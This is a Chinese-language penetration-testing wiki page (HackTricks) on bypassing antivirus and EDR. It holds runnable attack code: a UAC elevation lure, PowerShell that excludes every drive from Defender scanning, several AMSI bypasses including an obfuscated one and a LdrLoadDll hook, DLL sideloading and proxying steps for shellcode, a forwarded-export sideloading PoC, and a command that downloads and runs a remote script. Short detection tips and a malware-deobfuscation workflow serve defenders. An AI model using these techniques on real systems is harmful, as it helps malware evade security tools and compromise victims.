# Antivirus (AV) 绕过

{{#include ../banners/hacktricks-training.md}}

**本页面最初由** [**@m2rc_p**](https://twitter.com/m2rc_p)**编写！**

## 停止 Defender

- [defendnot](https://github.com/es3n1n/defendnot)：用于阻止 Windows Defender 运行的工具。
- [no-defender](https://github.com/es3n1n/no-defender)：通过伪装成另一个 AV 来阻止 Windows Defender 运行的工具。
- [如果你是管理员，则禁用 Defender](basic-powershell-for-pentesters/README.md)

### 篡改 Defender 前，用安装程序风格的 UAC 诱饵

伪装成游戏外挂的公开 loader 经常会以未签名的 Node.js/Nexe 安装程序形式分发，先**请求用户提升权限**，然后再让 Defender 失效。流程很简单：

1. 使用 `net session` 检查是否具有管理员权限。只有调用者拥有管理员权限时，该命令才会成功，因此命令失败意味着 loader 正以标准用户身份运行。
2. 立即使用 `RunAs` 动词重新启动自身，以触发预期的 UAC 同意提示，同时保留原始命令行。

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

受害者本来就相信自己正在安装“破解”软件，因此通常会接受提示，让 malware 获得修改 Defender 策略所需的权限。<sup>[[26]](#references)</sup>

### 对每个驱动器盘符设置全面的 `MpPreference` 排除项

获得提升的权限后，GachiLoader 风格的攻击链不会直接禁用服务，而是尽可能扩大 Defender 的盲区。loader 首先终止 GUI watchdog（`taskkill /F /IM SecHealthUI.exe`），然后添加**极其宽泛的排除项**，使每个用户配置文件、系统目录和可移动磁盘都无法被扫描：

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- 该循环会遍历每个已挂载的文件系统（D:\、E:\、USB 闪存盘等），因此**之后放到磁盘任意位置的 payload 都会被忽略**。
- 排除 `.sys` 扩展名是为将来做准备——攻击者保留了以后加载未签名驱动程序的选项，而无需再次触碰 Defender。
- 所有更改都写入 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`，使后续阶段能够确认排除项仍然生效，或扩展排除范围，而无需再次触发 UAC。

由于没有停止任何 Defender 服务，简单的健康检查仍会报告“antivirus active”，尽管实时检查实际上不会扫描这些路径。<sup>[[26]](#references)</sup>

## **AV Evasion 方法论**

目前，AV 会使用不同方法来检查文件是否恶意，包括静态检测、动态分析，以及更高级的 EDR 所采用的行为分析。

### **静态检测**

静态检测通过标记二进制文件或脚本中的已知恶意字符串或字节数组来实现，也会提取文件本身的信息（例如文件描述、公司名称、数字签名、图标、校验和等）。这意味着使用已知的公开工具可能更容易被发现，因为这些工具可能已经过分析并被标记为恶意。绕过这类检测有几种方法：

- **加密**

如果对二进制文件进行加密，AV 就无法检测你的程序，但你需要某种 loader 在内存中解密并运行该程序。

- **混淆**

有时，只需更改二进制文件或脚本中的一些字符串，就能使其通过 AV 检测；但根据你要混淆的内容，这可能会耗费大量时间。

- **自定义工具**

如果你开发自己的工具，就不会存在已知的恶意签名，但这需要投入大量时间和精力。

> [!TIP]
> 检查 Windows Defender 静态检测的一个好方法是使用 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上会将文件拆分为多个片段，然后让 Defender 分别扫描每个片段，从而准确指出二进制文件中哪些字符串或字节被标记。

我强烈建议你查看这个关于实用 AV Evasion 的 [YouTube 播放列表](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)。

### 用于静态分类器的离线 PE 特征测试

打包或加密的 payload 字节只是静态分类器的一个输入。EMBER2024 会提取 PE 特征，包括导入、导出、节、标头和 Authenticode 数据。<sup>[[48]](#references)</sup> 在一次 loader 实验中，加入 141 个看似无害的导入，使 EMBER2024 的恶意评分降低了 93%；而与恶意软件相关的导入则提高了评分。这一结果只适用于该模型和这些样本，并不能可靠地绕过特定的 AV/EDR 产品。<sup>[[50]](#references)</sup>

进行授权的 loader 测试时，应保持 payload 和执行路径不变，每个变体只更改一个预期的构建变量，并离线比较评分。检查生成的 PE 特征，因为一次构建更改可能影响多个特征组。<sup>[[49]](#references)[[50]](#references)</sup> 若要让预期的导入保留在 IAT 中，应在可达代码中调用选定的 Win32 API。应改变 API 的选择，并在不同构建版本中分散调用位置，而不是创建固定的伪装函数，以免其成为签名。该实验还报告称，有效的代码签名、导出项以及更多会扩大 `.pdata` 的函数都能降低评分；无效签名影响很小，`.pdata` 带来的影响也很小。<sup>[[50]](#references)</sup>

`thrember` 包提供特征提取和基准模型。安装后，使用现有的 `models` 目录运行 `thrember.download_models("models")`，然后从其父目录运行评分器：下载辅助函数会更改当前工作目录。PE 分类器可以对一个目录中的多个构建版本进行评分，而无需将其提交给扫描服务：<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

比较期间请固定模型和 feature-extractor 的版本。较低的离线评分只能说明这个分类器对变更后的二进制文件有何反应；它不能证明你成功绕过了行为分析、仿真或供应商使用的其他模型。<sup>[[49]](#references)[[50]](#references)</sup> 有关[虚拟化 payload 中的逐次构建多态性和外层二进制伪装](virtualized-payload-execution.md#camouflaging-the-outer-go-executable)，请参阅单独的执行模型。

### **动态分析**

动态分析是指 AV 在 sandbox 中运行你的二进制文件，并监视恶意活动（例如尝试解密并读取浏览器密码、对 LSASS 执行 minidump 等）。这一部分可能有点棘手，但你可以尝试以下方法来绕过 sandbox。

- **执行前休眠** 根据实现方式，这可能是绕过 AV 动态分析的好方法。AV 扫描文件的时间非常短，以免打断用户的工作流程，因此长时间休眠可能会妨碍对二进制文件的分析。问题在于，许多 AV sandbox 可以根据实现方式跳过休眠。
- **检查机器资源** 通常，sandbox 可用的资源很少（例如 < 2GB RAM），否则可能会拖慢用户的机器。你还可以发挥创意，例如检查 CPU 温度甚至风扇转速；sandbox 不一定会实现所有这些检查。
- **机器特定检查** 如果你想针对加入了 "contoso.local" 域的用户工作站，可以检查计算机的域是否与你指定的域匹配；如果不匹配，就让程序退出。

事实证明，Microsoft Defender 的 sandbox 计算机名是 HAL9TH，因此你可以在 malware 引爆前检查计算机名。如果名称匹配 HAL9TH，就说明你位于 Defender 的 sandbox 中，此时可以让程序退出。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>来源：<a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit) 提供了一些对抗 sandbox 的其他实用建议：

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 频道</p></figcaption></figure>

正如我们在本文前面所说，**公共工具**最终都会**被检测到**，因此你应该问自己一个问题：

例如，如果你想 dump LSASS，**真的需要使用 mimikatz 吗**？还是可以使用一个知名度较低、同样能 dump LSASS 的其他项目？

后者可能才是正确答案。以 mimikatz 为例，它可能是 AV 和 EDR 标记最多的 malware 之一。这个项目本身非常酷，但想要绕过 AV 使用它也会令人头疼，因此，针对你想实现的目标寻找替代方案即可。

> [!TIP]
> 修改 payload 以实现规避时，请确保在 Defender 中**关闭自动样本提交**。如果你的目标是长期实现规避，请务必**不要上传到 VIRUSTOTAL**。如果你想检查某个特定 AV 是否会检测到你的 payload，请在 VM 上安装该 AV，尝试关闭自动样本提交，并在那里进行测试，直到你对结果满意为止。

## EXEs 与 DLLs

只要条件允许，始终**优先使用 DLL 来实现规避**。根据我的经验，DLL 文件通常**更不容易被检测和分析**，因此在某些情况下，这是一个非常简单的规避检测技巧（当然，前提是你的 payload 能以 DLL 的形式运行）。

如下图所示，Havoc 的 DLL Payload 在 antiscan.me 上的检测率为 4/26，而 EXE payload 的检测率为 7/26。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me 对比普通的 Havoc EXE payload 和普通的 Havoc DLL</p></figcaption></figure>

接下来我们将介绍一些可用于 DLL 文件的技巧，让它们更加隐蔽。

## DLL Sideloading & Proxying

**DLL Sideloading** 利用加载器使用的 DLL 搜索顺序，将受害者应用程序与恶意 payload 放在一起。

你可以使用 [Siofra](https://github.com/Cybereason/siofra) 和以下 powershell 脚本检查哪些程序容易受到 DLL Sideloading 的影响：

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

此命令将输出 `"C:\Program Files\\"` 中易受 DLL hijacking 影响的程序列表，以及它们尝试加载的 DLL 文件。

我强烈建议你**亲自探索可进行 DLL Hijack/Sideload 的程序**。如果操作得当，这种技术相当隐蔽；但如果使用公开已知的 DLL Sideload 程序，你很容易被发现。

仅仅放置一个名称与程序预期加载的 DLL 相同的恶意 DLL，并不会加载你的 payload，因为程序预期该 DLL 中包含某些特定函数。为了解决这个问题，我们将使用另一种名为 **DLL Proxying/Forwarding** 的技术。

**DLL Proxying** 会将程序发出的调用从代理（恶意）DLL 转发到原始 DLL，从而保留程序的功能，同时还能执行你的 payload。

我将使用 [@flangvik](https://twitter.com/Flangvik/) 的 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 项目。

以下是我遵循的步骤：

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

最后一条命令会给我们两个文件：DLL 源代码模板，以及重命名后的原始 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

这些是结果：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和 proxy DLL 在 [antiscan.me](https://antiscan.me) 上的 Detection rate 都是 0/26！我认为这算是成功了。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 我**强烈建议**你观看 [S3cur3Th1sSh1t 的 twitch VOD](https://www.twitch.tv/videos/1644171543)，了解 DLL Sideloading；也可以观看 [ippsec 的视频](https://www.youtube.com/watch?v=3eROsG_WNpE)，进一步深入了解我们讨论的内容。

### 滥用转发导出（ForwardSideLoading）

Windows PE 模块可以导出实际为“转发器”的函数：导出项不指向代码，而是包含形如 `TargetDll.TargetFunc` 的 ASCII 字符串。当调用方解析该导出时，Windows 加载器会：

- 如果 `TargetDll` 尚未加载，则将其加载
- 从中解析 `TargetFunc`

需要了解的关键行为：
- 如果 `TargetDll` 是 KnownDLL，则会从受保护的 KnownDLLs 命名空间提供该 DLL（例如 ntdll、kernelbase、ole32）。<sup>[[15]](#references)</sup>
- 如果 `TargetDll` 不是 KnownDLL，则会使用常规 DLL 搜索顺序，其中包括执行转发解析的模块所在目录。

这就提供了一种间接的 sideloading 原语：找到一个将函数转发到非 KnownDLL 模块名的已签名 DLL，然后将该已签名 DLL 与一个由攻击者控制、名称与被转发的目标模块完全相同的 DLL 放在同一目录中。当调用被转发的导出函数时，加载器会解析转发并从同一目录加载你的 DLL，从而执行你的 DllMain。<sup>[[13]](#references)</sup>

Windows 11 上观察到的示例：

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` 不是 KnownDLL，因此会按照正常搜索顺序解析。

PoC（复制粘贴）：
1) 将已签名的系统 DLL 复制到可写文件夹
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 在同一文件夹中放入一个恶意的 `NCRYPTPROV.dll`。只需一个最简的 `DllMain` 即可执行代码；无需实现转发函数即可触发 `DllMain`。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) 使用已签名的 LOLBin 触发转发：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

观察到的行为：
- rundll32（已签名）加载 side-by-side 的 `keyiso.dll`（已签名）
- 解析 `KeyIsoSetAuditingInterface` 时，loader 会跟随转发到 `NCRYPTPROV.SetAuditingInterface`
- 随后，loader 从 `C:\test` 加载 `NCRYPTPROV.dll` 并执行其 `DllMain`
- 如果未实现 `SetAuditingInterface`，只有在 `DllMain` 已运行后才会出现“missing API”错误

排查提示：
- 重点关注转发到非 KnownDLL 模块的导出。KnownDLLs 列在 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 下。
- 你可以使用以下工具枚举转发的导出：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 查看 Windows 11 forwarder 清单以搜索候选项：https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

检测/防御思路：
- 监控 LOLBins（例如 rundll32.exe）从非系统路径加载已签名 DLL，随后从该目录加载具有相同基本名称的非 KnownDLLs
- 针对以下进程/模块链触发告警：`rundll32.exe` → 非系统路径中的 `keyiso.dll` → 用户可写路径下的 `NCRYPTPROV.dll`
- 强制实施代码完整性策略（WDAC/AppLocker），并禁止在应用程序目录中同时进行写入和执行

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

你可以使用 Freeze 以隐蔽的方式加载并执行 shellcode。

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion 就像猫鼠游戏，今天有效的方法明天可能就会被检测到，因此不要只依赖一种工具；如果可能，尝试串联多种 evasion 技术。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR 通常会在 `ntdll.dll` 的 syscall stub 上设置 **user-mode inline hooks**。要绕过这些 hooks，可以生成 **direct** 或 **indirect** syscall stub，加载正确的 **SSN**（System Service Number），并在不执行被 hook 的导出入口点的情况下切换到 kernel mode。<sup>[[32]](#references)</sup>

**调用选项：**
- **Direct (embedded)**：在生成的 stub 中发出 `syscall`/`sysenter`/`SVC #0` 指令（不会命中 `ntdll` 导出）。
- **Indirect**：跳转到 `ntdll` 中现有的 `syscall` gadget，使 kernel transition 看起来像是从 `ntdll` 发起的（有助于绕过启发式检测）；**randomized indirect** 会在每次调用时从一个 gadget 池中随机选择。
- **Egg-hunt**：避免在磁盘上嵌入静态的 `0F 05` opcode 序列；在运行时解析 syscall 序列。

**抗 hook 的 SSN 解析策略：**
- **FreshyCalls (VA sort)**：通过按虚拟地址对 syscall stub 排序来推断 SSN，而不是读取 stub 字节。
- **SyscallsFromDisk**：映射干净的 `\KnownDlls\ntdll.dll`，从其 `.text` 中读取 SSN，然后取消映射（可绕过所有内存中的 hooks）。
- **RecycledGate**：结合基于 VA 排序的 SSN 推断和 stub 干净时的 opcode 验证；如果 stub 被 hook，则回退到 VA 推断。
- **HW Breakpoint**：在 `syscall` 指令上设置 DR0，并使用 VEH 在运行时从 `EAX` 捕获 SSN，而无需解析被 hook 的字节。

SysWhispers4 用法示例：
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI 的创建旨在防止「[无文件恶意软件](https://en.wikipedia.org/wiki/Fileless_malware)」。最初，AV 只能扫描**磁盘上的文件**，因此，如果你能以某种方式**直接在内存中**执行 payload，AV 就无法阻止，因为它没有足够的可见性。

AMSI 功能集成在 Windows 的以下组件中。

- 用户帐户控制（UAC）（提升 EXE、COM、MSI 或 ActiveX 安装的权限）
- PowerShell（脚本、交互式使用和动态代码求值）
- Windows Script Host（wscript.exe 和 cscript.exe）
- JavaScript 和 VBScript
- Office VBA 宏

它让 antivirus 解决方案能够以未加密且未混淆的形式查看脚本内容，从而检查脚本行为。

运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 会在 Windows Defender 中触发以下警报。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

注意，它会先加上 `amsi:`，然后显示运行脚本的可执行文件路径；本例中是 powershell.exe。

我们没有将任何文件写入磁盘，但仍然因为 AMSI 而在内存中被检测到。

此外，从 **.NET 4.8** 开始，C# 代码也会经过 AMSI 扫描。这甚至会影响使用 `Assembly.Load(byte[])` 加载内存中的代码执行。因此，如果你希望在内存中执行代码时绕过 AMSI，建议使用较低版本的 .NET（例如 4.7.2 或更低版本）。

绕过 AMSI 有几种方法：

- **混淆**

由于 AMSI 主要依靠静态检测，因此修改你尝试加载的脚本，可能是规避检测的有效方法。

不过，AMSI 能够还原脚本的混淆内容，即使脚本经过多层混淆。因此，根据混淆方式的不同，混淆可能并不是好选择。这使得规避检测并非那么简单。不过，有时只需修改几个变量名就能成功，所以这取决于相关内容被标记的程度。

- **AMSI Bypass**

由于 AMSI 是通过将 DLL 加载到 powershell（以及 cscript.exe、wscript.exe 等）的进程中实现的，即使以非特权用户身份运行，也可以轻松篡改它。由于 AMSI 的实现存在这一缺陷，研究人员发现了多种规避 AMSI 扫描的方法。

**强制触发错误**

强制 AMSI 初始化失败（amsiInitFailed），将导致当前进程不再启动扫描。最初由 [Matt Graeber](https://twitter.com/mattifestation) 披露此方法，之后 Microsoft 开发了一个签名来阻止其被广泛使用。

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

只需一行 PowerShell 代码，就能让当前 PowerShell 进程中的 AMSI 无法使用。当然，这行代码本身已被 AMSI 标记，因此需要做一些修改才能使用这种技术。

这是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 中获取的修改版 AMSI bypass。

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

请记住，这篇文章发布后很可能会被标记，因此如果你的计划是保持不被发现，就不应该发布任何代码。

**Memory Patching**

此技术最初由 [@RastaMouse](https://twitter.com/_RastaMouse/) 发现。它通过查找 amsi.dll 中的 "AmsiScanBuffer" 函数地址（负责扫描用户提供的输入），并将其覆盖为返回 E_INVALIDARG 代码的指令。这样，实际扫描的结果就会返回 0，并被解释为干净结果。

> [!TIP]
> 请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)，了解更详细的说明。

还有许多其他用于通过 powershell 绕过 AMSI 的技术。请查看[**此页面**](basic-powershell-for-pentesters/index.html#amsi-bypass)和[**此 repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)以了解更多信息。

### 通过阻止 amsi.dll 加载来阻止 AMSI（LdrLoadDll hook）

只有在 `amsi.dll` 加载到当前进程后，AMSI 才会初始化。一种健壮且与语言无关的绕过方法是在 `ntdll!LdrLoadDll` 上设置用户模式 hook，当请求的模块是 `amsi.dll` 时返回错误。这样，AMSI 就不会加载，该进程也不会进行任何扫描。<sup>[[23]](#references)</sup>

实现概要（x64 C/C++ 伪代码）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
备注
- 适用于 PowerShell、WScript/CScript 和自定义加载器（任何原本会加载 AMSI 的程序）。
- 可配合通过 stdin 输入脚本（`PowerShell.exe -NoProfile -NonInteractive -Command -`），避免留下过长的命令行痕迹。
- 曾见过通过 LOLBins 执行的加载器使用此方法（例如由 `regsvr32` 调用 `DllRegisterServer`）。

工具 **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** 也可以生成用于绕过 AMSI 的脚本。
工具 **[https://amsibypass.com/](https://amsibypass.com/)** 也可以生成用于绕过 AMSI 的脚本：通过随机化用户定义函数、变量和字符表达式来规避签名检测，并随机改变 PowerShell 关键字的字符大小写。

**移除检测到的签名**

你可以使用 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 之类的工具，从当前进程的内存中移除检测到的 AMSI 签名。这类工具会扫描当前进程的内存以查找 AMSI 签名，然后用 NOP 指令覆盖它，从而将其从内存中移除。

**使用 AMSI 的 AV/EDR 产品**

你可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 找到使用 AMSI 的 AV/EDR 产品列表。

**使用 Powershell 版本 2**
如果使用 PowerShell 版本 2，AMSI 将不会加载，因此你可以运行脚本而不被 AMSI 扫描。你可以这样做：

```bash
powershell.exe -version 2
```

## PS 日志记录

PowerShell 日志记录是一项功能，可记录系统上执行的所有 PowerShell 命令。这对审计和故障排除很有用，但也可能给**想要规避检测的攻击者带来问题**。

要绕过 PowerShell 日志记录，可以使用以下技术：

- **禁用 PowerShell Transcription 和 Module Logging**：可以使用 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 等工具来实现。
- **使用 PowerShell 2 版本**：使用 PowerShell 2 版本时，AMSI 不会加载，因此你可以运行脚本而不被 AMSI 扫描。可以这样做：`powershell.exe -version 2`
- **使用非托管 PowerShell 会话**：使用 [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 托管 PowerShell，而不启动 `powershell.exe`（Cobalt Strike 的 `powerpick` 使用的就是这种方式）。这可以规避专门针对 `powershell.exe` 进程的控制措施，但本身不会禁用 AMSI、Script Block Logging 或其他所有 PowerShell 防御；覆盖范围取决于运行时和宿主实现。


## 混淆

> [!TIP]
> 多种混淆技术依赖加密数据，这会提高二进制文件的熵，使 AV 和 EDR 更容易检测到它。请谨慎使用，或许只对代码中敏感或需要隐藏的特定部分进行加密。

### 对 ConfuserEx 保护的 .NET 二进制文件进行反混淆

分析使用 ConfuserEx 2（或其商业分支版本）的恶意软件时，通常会遇到多层保护，这些保护会阻止反编译器和沙箱分析。下面的工作流程能够可靠地**恢复接近原始状态的 IL**，之后即可使用 dnSpy 或 ILSpy 等工具将其反编译为 C#。<sup>[[10]](#references)</sup>

1.  移除反篡改保护——ConfuserEx 会加密每个*方法体*，并在*模块*静态构造函数（`<Module>.cctor`）中解密。它还会修改 PE 校验和，因此任何改动都会导致二进制文件崩溃。使用 **AntiTamperKiller** 定位加密的元数据表、恢复 XOR 密钥，并重写为干净的程序集：
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   输出包含 6 个 anti-tamper 参数（`key0-key3`、`nameHash`、`internKey`），构建自己的 unpacker 时可能会用到。

2.  符号 / 控制流恢复 – 将 *clean* 文件提供给 **de4dot-cex**（一个支持 ConfuserEx 的 de4dot 分支）。
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   标志：
     • `-p crx` – 选择 ConfuserEx 2 配置
     • de4dot 会撤销控制流扁平化、恢复原始命名空间、类和变量名，并解密常量字符串。

3.  Proxy-call stripping – ConfuserEx 会将直接方法调用替换为轻量级包装器（也称为 *proxy calls*），以进一步妨碍反编译。使用 **ProxyCall-Remover** 移除它们：
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   完成此步骤后，你应该会看到常规的 .NET API，例如 `Convert.FromBase64String` 或 `AES.Create()`，而不是不透明的包装函数（`Class8.smethod_10`，……）。

4.  手动清理 – 在 dnSpy 中运行生成的二进制文件，搜索大型 Base64 数据块或 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 的使用，以定位*真正的* payload。恶意软件通常会将其存储为在 `<Module>.byte_0` 中初始化的 TLV 编码字节数组。

上述流程无需运行恶意样本即可还原执行流程——在离线工作站上操作时很有用。

> 🛈  ConfuserEx 会生成一个名为 `ConfusedByAttribute` 的自定义属性，可用作 IOC 来自动筛查样本。

#### 单行命令
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目旨在提供一个开源的 [LLVM](http://www.llvm.org/) 编译套件 fork，通过 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改来增强软件安全性。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示了如何使用 `C++11/14` 语言在编译时生成混淆代码，无需使用任何外部工具，也无需修改编译器。
- [**obfy**](https://github.com/fritzone/obfy): 添加一层由 C++ template metaprogramming framework 生成的混淆操作，让想要破解应用程序的人更难得手。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 binary obfuscator，能够混淆各种不同的 PE 文件，包括：.exe、.dll、.sys
- [**metame**](https://github.com/a0rtega/metame): Metame 是一个适用于任意可执行文件的简单 metamorphic code 引擎。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个面向 LLVM 支持语言的细粒度 code obfuscation framework，使用 ROP（return-oriented programming）。ROPfuscator 在汇编代码层级对程序进行混淆，将常规指令转换为 ROP chains，从而打破我们对正常控制流的惯常认知。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是一个用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能够将现有的 EXE/DLL 转换为 shellcode，然后加载它们

### LLVM compiler-assisted per-function self-masking

不必只在 implant 休眠时才对其整体进行 masking，经过修改的 LLVM X86 backend 可以让选定函数在不活动时始终保持 XOR-masked。Function Peekaboo PoC 会选取反修饰名称中包含 `REG_` 的函数，在最终机器码周围注入位置无关的入口/出口 stubs，并在 `.text` 中生成一个共享的 masking handler；源码级签名和 Windows x64 calling convention 均保持不变。<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

该变换应在指令选择和优化之后进行，因为它必须覆盖**每一个生成的 return**，并掌握确切的 x86 布局。一个 pre-emission `MachineFunctionPass` 会找到最后一个 `MachineInstr::isReturn()`，将其删除，使最终路径落入追加的 epilogue；并将更早的 returns 替换为 `JMP_1 handler`。保留每个 return 之前编译器生成的栈/帧清理操作；只重定向 return 指令本身。<sup>[[38]](#references)[[39]](#references)</sup>

